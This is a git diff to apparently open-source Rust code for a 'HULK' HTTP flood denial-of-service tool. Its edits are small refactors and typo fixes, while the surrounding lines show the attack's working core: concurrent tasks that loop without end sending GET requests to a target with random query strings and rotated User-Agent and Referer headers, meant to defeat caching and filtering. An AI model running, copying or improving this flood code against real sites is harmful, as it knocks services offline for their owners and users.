@@ -91,8 +91,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     };
     println!("[*] Starting HULK attack on {}", args.target);
     let tasks = (0..args.max_connections).map(|_| {
-        // clone the arguments to pass to the task since we are move-ing them
-        // Is there a cleaner way to do this ?
+        // clone the arguments to pass to the task since we are move-ing them to the task
         let target = args.target.clone();
         let parameter_name = args.parameter_name.clone();
         let user_agents = user_agents.clone();
@@ -115,6 +114,7 @@ async fn fetch_url(
     let https = HttpsConnector::new();
     let client = Client::builder().build::<_, hyper::Body>(https);
     let user_agents_len = user_agents.len();
+    let referers_len = referers.len();
     loop {
         let uri = if target.contains("?") {
             format!(
@@ -137,12 +137,13 @@ async fn fetch_url(
         };
         let referer = format!(
             "{}{}",
-            referers[rand::thread_rng().gen_range(0..referers.len())],
+            referers[rand::thread_rng().gen_range(0..referers_len)],
             random_string(rand::thread_rng().gen_range(5..10))
         );
         // I need to clone this, otherwise I get borrowing issues.
-        // I'm new to Rust and there might be a cleanr way to do this. Feel free to submit a PR.
+        // I'm new to Rust and there might be a cleaner way to do this. Feel free to submit a PR.
         let user_agent = user_agents[rand::thread_rng().gen_range(0..user_agents_len)].clone();
+
         let request = Request::get(uri)
             .header("User-Agent", user_agent)
             .header("Referer", referer)
